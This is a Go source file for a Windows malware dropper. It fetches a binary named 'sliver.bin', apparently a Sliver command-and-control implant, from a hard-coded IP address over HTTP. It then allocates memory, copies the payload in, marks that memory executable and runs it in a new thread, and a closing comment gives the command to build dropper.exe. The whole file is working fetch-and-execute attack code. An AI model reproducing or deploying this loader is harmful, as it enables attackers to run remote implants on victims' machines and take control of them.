package main

import (
	_ "embed"
	"io"
	"net/http"
	"unsafe"

	// Sub Repositories
	"golang.org/x/sys/windows"
)

const (
	// MEM_COMMIT is a Windows constant used with Windows API calls
	MEM_COMMIT = 0x1000
	// MEM_RESERVE is a Windows constant used with Windows API calls
	MEM_RESERVE = 0x2000
	// PAGE_EXECUTE_READ is a Windows constant used with Windows API calls
	PAGE_EXECUTE_READ = 0x20
	// PAGE_READWRITE is a Windows constant used with Windows API calls
	PAGE_READWRITE = 0x04
)

var (
	shellUrl = "http://192.168.64.129:80/sliver.bin"
)

func pullshell() []byte {
	resp, err := http.Get(shellUrl)
	if err != nil {
		return nil
	}

	defer resp.Body.Close()

	payload, err := io.ReadAll(resp.Body)

	if err != nil {
		return nil
	}
	return payload
}

func main() {
	// out := pullshell()
	// print(out)

	// Pop Calc Shellcode

	shellcode := pullshell()

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	VirtualProtect := kernel32.NewProc("VirtualProtect")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
	CreateThread := kernel32.NewProc("CreateThread")
	WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")

	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)

	RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	oldProtect := PAGE_READWRITE
	VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))

	//var lpThreadId uint32
	thread, _, _ := CreateThread.Call(0, 0, addr, uintptr(0), 0, 0)

	WaitForSingleObject.Call(thread, 0xFFFFFFFF)
}

// GOOS=windows GOARCH=amd64 go build -o dropper.exe dropper.go
